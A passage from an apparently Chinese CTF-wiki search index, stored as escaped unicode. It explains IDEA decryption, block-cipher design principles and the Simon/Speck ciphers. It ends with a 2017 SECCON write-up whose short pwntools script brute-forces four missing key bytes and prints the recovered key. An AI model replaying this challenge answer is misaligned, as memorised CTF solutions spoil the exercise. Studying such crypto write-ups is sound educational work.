\u6bd4\u7279\u3002\u8be5\u7b97\u6cd5\u4f1a\u5bf9\u8f93\u5165\u7684\u6570\u636e\u5757\u8fdb\u884c8\u6b21\u76f8\u540c\u7684\u53d8\u6362\uff0c\u53ea\u662f\u6bcf\u6b21\u4f7f\u7528\u7684\u5bc6\u94a5\u4e0d\u540c\uff0c\u6700\u540e\u4f1a\u8fdb\u884c\u4e00\u6b21\u8f93\u51fa\u53d8\u6362\u3002\u6bcf\u4e00\u8f6e\u7684\u64cd\u4f5c \u53ef\u4ee5\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f 16 \u6bd4\u7279\u4f4d\u4e00\u7ec4\u3002\u6bcf\u4e00\u8f6e\u7684\u4e3b\u8981\u6267\u884c\u7684\u8fd0\u7b97\u6709 \u6309\u4f4d\u5f02\u6216\uff0c\u2295 \u6a21\u52a0\uff0c\u6a21\u6570\u4e3a 2^{16} 2^{16} \uff0c\u229e \u6a21\u4e58\uff0c\u6a21\u6570\u4e3a 2^{16}+1 2^{16}+1 \uff0c\u2299\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f 0x0000 \u7684\u8f93\u5165\u4f1a\u88ab\u4fee\u6539\u4e3a 2^{16} 2^{16} \uff0c 2^{16} 2^{16} \u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u88ab\u4fee\u6539\u4e3a0x0000\u3002 \u8fd9\u91cc\u6211\u4eec\u79f0\u7531 K5\uff0cK6 \u6784\u6210\u7684\u4e2d\u95f4\u90a3\u4e2a\u65b9\u683c\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3aMA\u3002\u8fd9\u4e5f\u662f IDEA \u7b97\u6cd5\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6b64\u5916\uff0c\u6211\u4eec\u79f0 MA_L \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u5de6\u4fa7\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u6700\u5de6\u8fb9\u7684 16 \u6bd4\u7279\u64cd\u4f5c\uff1bMA_R \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u53f3\u534a\u90e8\u5206\u7684\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u7b2c\u4e09\u4e2a 16 \u6bd4\u7279\u64cd\u4f5c\u3002 \u5728\u6700\u540e\u8f93\u51fa\u8f6e\u7684\u64cd\u4f5c\u5982\u4e0b","title":"\u52a0\u5bc6\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_5","text":"\u89e3\u5bc6\u6d41\u7a0b\u4e0e\u52a0\u5bc6\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5bc6\u94a5\u7684\u9009\u53d6 \u7b2c i(1-9) \u8f6e\u7684\u89e3\u5bc6\u7684\u5bc6\u94a5\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u7531\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u7b2c10-i \u8f6e\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u5f97\u51fa \u5176\u4e2d\u7b2c 1 \u4e2a\u548c\u7b2c 4 \u4e2a\u89e3\u5bc6\u5b50\u5bc6\u94a5\u4e3a\u76f8\u5e94\u7684\u5b50\u5bc6\u94a5\u5173\u4e8e 2^{16}+1 2^{16}+1 \u7684\u4e58\u6cd5\u9006\u5143\u3002 \u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u7684\u53d6\u6cd5\u4e3a \u5f53\u8f6e\u6570\u4e3a2\uff0c...\uff0c8\u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c3\u4e2a\u548c\u7b2c2\u4e2a\u7684\u5b50\u5bc6\u94a5\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u5f53\u8f6e\u6570\u4e3a 1 \u6216 9 \u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u5bf9\u5e94\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u7b2c 5 \u548c\u7b2c 6 \u4e2a\u5bc6\u94a5\u4e0d\u53d8\u3002","title":"\u89e3\u5bc6\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_6","text":"\u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\u7b97\u6cd5\u7684\u6b63\u786e\u6027\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e8e\u89e3\u5bc6\u7b97\u6cd5\u7684\u7b2c\u4e00\u8f6e\uff0c\u9996\u5148\u6211\u4eec\u5148\u770b\u4e00\u4e0b Y_i Y_i \u662f\u5982\u4f55\u5f97\u5230\u7684 Y_1 = W_{81} \\odot Z_{49} Y_1 = W_{81} \\odot Z_{49} Y_2=W_{83}\\boxplus Z_{50} Y_2=W_{83}\\boxplus Z_{50} Y_3=W_{82}\\boxplus Z_{51} Y_3=W_{82}\\boxplus Z_{51} Y_4=W_{83}\\odot Z_{52} Y_4=W_{83}\\odot Z_{52} \u89e3\u5bc6\u65f6\uff0c\u7b2c\u4e00\u8f6e\u76f4\u63a5\u8fdb\u884c\u7684\u53d8\u6362\u4e3a J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} \u53ef\u4ee5\u770b\u51fa\u5f97\u5230\u7684\u7ed3\u679c\u53ea\u6709\u4e2d\u95f4\u7684\u4e24\u4e2a16\u4f4d\u52a0\u5bc6\u7ed3\u679c\u6070\u597d\u76f8\u53cd\u3002\u6211\u4eec\u8fdb\u4e00\u6b65\u770b\u4e00\u4e0b W_{8i} W_{8i} \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) \u90a3\u4e48\u5bf9\u4e8eV11\u6765\u8bf4 V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) \u901a\u8fc7\u7b80\u5355\u5e26\u5165\u5df2\u6709\u7684\u503c\uff0c\u663e\u7136 V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} \u5bf9\u4e8e\u5176\u4ed6\u7684\u5143\u7d20\u4e5f\u7c7b\u4f3c\uff0c\u90a3\u4e48\u5176\u5b9e\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c\u4e00\u8f6e\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u6070\u597d\u662f I_{81},I_{83},I_{82},I_{84} I_{81},I_{83},I_{82},I_{84} \u3002 \u7c7b\u4f3c\u5730\uff0c\u8fd9\u4e2a\u5173\u7cfb\u53ef\u4ee5\u4e00\u76f4\u6ee1\u8db3\u76f4\u5230 V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} \u90a3\u4e48\u6700\u540e\u518d\u7ecf\u8fc7\u4e00\u6b21\u7b80\u5355\u7684\u8f93\u51fa\u53d8\u6362\uff0c\u6070\u597d\u5f97\u5230\u6700\u521d\u52a0\u5bc6\u7684\u6570\u503c\u3002","title":"\u603b\u4f53\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_7","text":"2017 HITCON seccomp","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/introduction/","text":"\u5757\u52a0\u5bc6 \u00b6 \u6982\u8ff0 \u00b6 \u6240\u8c13\u5757\u52a0\u5bc6\u5c31\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u5757\u660e\u6587\uff0c\u5e38\u89c1\u7684\u52a0\u5bc6\u7b97\u6cd5\u6709 IDEA \u52a0\u5bc6 DES \u52a0\u5bc6 AES \u52a0\u5bc6 \u5757\u52a0\u5bc6\u4e5f\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u5176\u5b9e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5757\u52a0\u5bc6\u7406\u89e3\u4e00\u79cd\u7279\u6b8a\u7684\u66ff\u4ee3\u5bc6\u7801\uff0c\u4f46\u662f\u5176\u6bcf\u6b21\u66ff\u4ee3\u7684\u662f\u4e00\u5927\u5757\u3002\u800c\u6b63\u662f\u7531\u4e8e\u4e00\u5927\u5757\uff0c\u660e\u6587\u7a7a\u95f4\u5de8\u5927\uff0c\u800c\u4e14\u5bf9\u4e8e\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u65e0\u6cd5\u505a\u4e00\u4e2a\u8868\u8fdb\u884c\u5bf9\u5e94\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u56e0\u6b64\u5fc5\u987b\u5f97\u6709 \u590d\u6742 \u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u6765\u52a0\u89e3\u5bc6\u660e\u5bc6\u6587\u3002 \u57fa\u672c\u7b56\u7565 \u00b6 \u5728\u5206\u7ec4\u5bc6\u7801\u8bbe\u8ba1\u65f6\uff0c\u5145\u5206\u4f7f\u7528\u4e86 Shannon \u63d0\u51fa\u7684\u4e24\u5927\u7b56\u7565\uff1a\u6df7\u6dc6\u4e0e\u6269\u6563\u4e24\u5927\u7b56\u7565\u3002 \u6df7\u6dc6 \u00b6 \u6df7\u6dc6\uff0cConfusion\uff0c\u5c06\u5bc6\u6587\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5373\u4f7f\u83b7\u53d6\u4e86\u5bc6\u6587\u7684\u4e00\u4e9b\u7edf\u8ba1\u7279\u6027\uff0c\u4e5f\u65e0\u6cd5\u63a8\u6d4b\u5bc6\u94a5\u3002\u4e00\u822c\u4f7f\u7528\u590d\u6742\u7684\u975e\u7ebf\u6027\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u5f88\u597d\u7684\u6df7\u6dc6\u6548\u679c\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b S \u76d2 \u4e58\u6cd5 \u6269\u6563 \u00b6 \u6269\u6563\uff0cDiffusion\uff0c\u4f7f\u5f97\u660e\u6587\u4e2d\u7684\u6bcf\u4e00\u4f4d\u5f71\u54cd\u5bc6\u6587\u4e2d\u7684\u8bb8\u591a\u4f4d\u3002\u5e38\u89c1\u7684\u65b9\u6cd5\u6709 \u7ebf\u6027\u53d8\u6362 \u7f6e\u6362 \u79fb\u4f4d\uff0c\u5faa\u73af\u79fb\u4f4d \u5e38\u89c1\u52a0\u89e3\u5bc6\u7ed3\u6784 \u00b6 \u76ee\u524d\u5757\u52a0\u5bc6\u4e2d\u4e3b\u8981\u4f7f\u7528\u7684\u662f\u7ed3\u6784\u662f \u8fed\u4ee3\u7ed3\u6784\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fed\u4ee3\u7ed3\u6784\u4fbf\u4e8e\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff0c\u540c\u65f6\u65b9\u4fbf\u5b89\u5168\u6027\u8bc4\u4f30\u3002 \u8fed\u4ee3\u7ed3\u6784 \u00b6 \u6982\u8ff0 \u00b6 \u8fed\u4ee3\u7ed3\u6784\u57fa\u672c\u5982\u4e0b\uff0c\u4e00\u822c\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u5bc6\u94a5\u7f6e\u6362 \u8f6e\u52a0\u5bc6\u51fd\u6570 \u8f6e\u89e3\u5bc6\u51fd\u6570 \u8f6e\u51fd\u6570 \u00b6 \u76ee\u524d\u6765\u8bf4\uff0c\u8f6e\u51fd\u6570\u4e3b\u8981\u6709\u4e3b\u8981\u6709\u4ee5\u4e0b\u8bbe\u8ba1\u65b9\u6cd5 Feistel Network\uff0c\u7531 Horst Feistel \u53d1\u660e\uff0cDES \u8bbe\u8ba1\u8005\u4e4b\u4e00\u3002 DES Substitution-Permutation Network(SPN) AES \u5176\u4ed6\u65b9\u6848 \u5bc6\u94a5\u6269\u5c55 \u00b6 \u76ee\u524d\uff0c\u5bc6\u94a5\u6269\u5c55\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6ca1\u6709\u89c1\u5230\u4ec0\u4e48\u5b8c\u7f8e\u7684\u5bc6\u94a5\u6269\u5c55\u65b9\u6cd5\uff0c\u57fa\u672c\u539f\u5219\u662f\u4f7f\u5f97\u5bc6\u94a5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u5c3d\u53ef\u80fd\u5f71\u54cd\u591a\u8f6e\u7684\u8f6e\u5bc6\u94a5\u3002","title":"\u5757\u52a0\u5bc6\u7b80\u4ecb"},{"location":"crypto/blockcipher/introduction/#_1","text":"","title":"\u5757\u52a0\u5bc6"},{"location":"crypto/blockcipher/introduction/#_2","text":"\u6240\u8c13\u5757\u52a0\u5bc6\u5c31\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u5757\u660e\u6587\uff0c\u5e38\u89c1\u7684\u52a0\u5bc6\u7b97\u6cd5\u6709 IDEA \u52a0\u5bc6 DES \u52a0\u5bc6 AES \u52a0\u5bc6 \u5757\u52a0\u5bc6\u4e5f\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u5176\u5b9e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5757\u52a0\u5bc6\u7406\u89e3\u4e00\u79cd\u7279\u6b8a\u7684\u66ff\u4ee3\u5bc6\u7801\uff0c\u4f46\u662f\u5176\u6bcf\u6b21\u66ff\u4ee3\u7684\u662f\u4e00\u5927\u5757\u3002\u800c\u6b63\u662f\u7531\u4e8e\u4e00\u5927\u5757\uff0c\u660e\u6587\u7a7a\u95f4\u5de8\u5927\uff0c\u800c\u4e14\u5bf9\u4e8e\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u65e0\u6cd5\u505a\u4e00\u4e2a\u8868\u8fdb\u884c\u5bf9\u5e94\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u56e0\u6b64\u5fc5\u987b\u5f97\u6709 \u590d\u6742 \u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u6765\u52a0\u89e3\u5bc6\u660e\u5bc6\u6587\u3002","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/introduction/#_3","text":"\u5728\u5206\u7ec4\u5bc6\u7801\u8bbe\u8ba1\u65f6\uff0c\u5145\u5206\u4f7f\u7528\u4e86 Shannon \u63d0\u51fa\u7684\u4e24\u5927\u7b56\u7565\uff1a\u6df7\u6dc6\u4e0e\u6269\u6563\u4e24\u5927\u7b56\u7565\u3002","title":"\u57fa\u672c\u7b56\u7565"},{"location":"crypto/blockcipher/introduction/#_4","text":"\u6df7\u6dc6\uff0cConfusion\uff0c\u5c06\u5bc6\u6587\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5373\u4f7f\u83b7\u53d6\u4e86\u5bc6\u6587\u7684\u4e00\u4e9b\u7edf\u8ba1\u7279\u6027\uff0c\u4e5f\u65e0\u6cd5\u63a8\u6d4b\u5bc6\u94a5\u3002\u4e00\u822c\u4f7f\u7528\u590d\u6742\u7684\u975e\u7ebf\u6027\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u5f88\u597d\u7684\u6df7\u6dc6\u6548\u679c\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b S \u76d2 \u4e58\u6cd5","title":"\u6df7\u6dc6"},{"location":"crypto/blockcipher/introduction/#_5","text":"\u6269\u6563\uff0cDiffusion\uff0c\u4f7f\u5f97\u660e\u6587\u4e2d\u7684\u6bcf\u4e00\u4f4d\u5f71\u54cd\u5bc6\u6587\u4e2d\u7684\u8bb8\u591a\u4f4d\u3002\u5e38\u89c1\u7684\u65b9\u6cd5\u6709 \u7ebf\u6027\u53d8\u6362 \u7f6e\u6362 \u79fb\u4f4d\uff0c\u5faa\u73af\u79fb\u4f4d","title":"\u6269\u6563"},{"location":"crypto/blockcipher/introduction/#_6","text":"\u76ee\u524d\u5757\u52a0\u5bc6\u4e2d\u4e3b\u8981\u4f7f\u7528\u7684\u662f\u7ed3\u6784\u662f \u8fed\u4ee3\u7ed3\u6784\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fed\u4ee3\u7ed3\u6784\u4fbf\u4e8e\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff0c\u540c\u65f6\u65b9\u4fbf\u5b89\u5168\u6027\u8bc4\u4f30\u3002","title":"\u5e38\u89c1\u52a0\u89e3\u5bc6\u7ed3\u6784"},{"location":"crypto/blockcipher/introduction/#_7","text":"","title":"\u8fed\u4ee3\u7ed3\u6784"},{"location":"crypto/blockcipher/introduction/#_8","text":"\u8fed\u4ee3\u7ed3\u6784\u57fa\u672c\u5982\u4e0b\uff0c\u4e00\u822c\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u5bc6\u94a5\u7f6e\u6362 \u8f6e\u52a0\u5bc6\u51fd\u6570 \u8f6e\u89e3\u5bc6\u51fd\u6570","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/introduction/#_9","text":"\u76ee\u524d\u6765\u8bf4\uff0c\u8f6e\u51fd\u6570\u4e3b\u8981\u6709\u4e3b\u8981\u6709\u4ee5\u4e0b\u8bbe\u8ba1\u65b9\u6cd5 Feistel Network\uff0c\u7531 Horst Feistel \u53d1\u660e\uff0cDES \u8bbe\u8ba1\u8005\u4e4b\u4e00\u3002 DES Substitution-Permutation Network(SPN) AES \u5176\u4ed6\u65b9\u6848","title":"\u8f6e\u51fd\u6570"},{"location":"crypto/blockcipher/introduction/#_10","text":"\u76ee\u524d\uff0c\u5bc6\u94a5\u6269\u5c55\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6ca1\u6709\u89c1\u5230\u4ec0\u4e48\u5b8c\u7f8e\u7684\u5bc6\u94a5\u6269\u5c55\u65b9\u6cd5\uff0c\u57fa\u672c\u539f\u5219\u662f\u4f7f\u5f97\u5bc6\u94a5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u5c3d\u53ef\u80fd\u5f71\u54cd\u591a\u8f6e\u7684\u8f6e\u5bc6\u94a5\u3002","title":"\u5bc6\u94a5\u6269\u5c55"},{"location":"crypto/blockcipher/simon-speck/","text":"Simon and Speck Block Ciphers \u00b6 \u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002 Simon Block Cipher \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728 \u786c\u4ef6\u5b9e\u73b0 \u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002 Simon Block Cipher \u662f\u5e73\u8861\u7684 Feistel cipher \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709 \u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a Simon 2 n /nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b \u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c \u5176\u4e2d\uff0c z_j z_j \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 z_j z_j \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002 Constant z_{0} z_{0} =11111010001001010110000111001101111101000100101011000011100110 z_{1} z_{1} =10001110111110010011000010110101000111011111001001100001011010 z_{2} z_{2} =10101111011100000011010010011000101000010001111110010110110011 z_{3} z_{3} =11011011101011000110010111100000010010001010011100110100001111 z_{4} z_{4} =11010001111001101011011000100000010111000011001010010011101111 2017 SECCON Simon and Speck Block Ciphers \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 \u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece https://github.com/bozhu/NSA-ciphers/blob/master/simon.py \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002 \u5177\u4f53\u5982\u4e0b from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = \"fixed\" ) print key if __name__ == \"__main__\" : solve () \u7ed3\u679c\u5982\u4e0b \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\" \u53c2\u8003\u6587\u732e \u00b6 https://en.wikipedia.org/wiki/Simon_(cipher )","title":"Simon and Speck"},{"location":"crypto/blockcipher/simon-speck/#simon-and-speck-block-ciphers","text":"\u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002","title":"Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#simon-block-cipher","text":"","title":"Simon Block Cipher"},{"location":"crypto/blockcipher/simon-speck/#_1","text":"Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728 \u786c\u4ef6\u5b9e\u73b0 \u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002 Simon Block Cipher \u662f\u5e73\u8861\u7684 Feistel cipher \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709 \u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a Simon 2 n /nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b \u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c \u5176\u4e2d\uff0c z_j z_j \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 z_j z_j \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002 Constant z_{0} z_{0} =11111010001001010110000111001101111101000100101011000011100110 z_{1} z_{1} =10001110111110010011000010110101000111011111001001100001011010 z_{2} z_{2} =10101111011100000011010010011000101000010001111110010110110011 z_{3} z_{3} =11011011101011000110010111100000010010001010011100110100001111 z_{4} z_{4} =11010001111001101011011000100000010111000011001010010011101111","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/simon-speck/#2017-seccon-simon-and-speck-block-ciphers","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 \u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece https://github.com/bozhu/NSA-ciphers/blob/master/simon.py 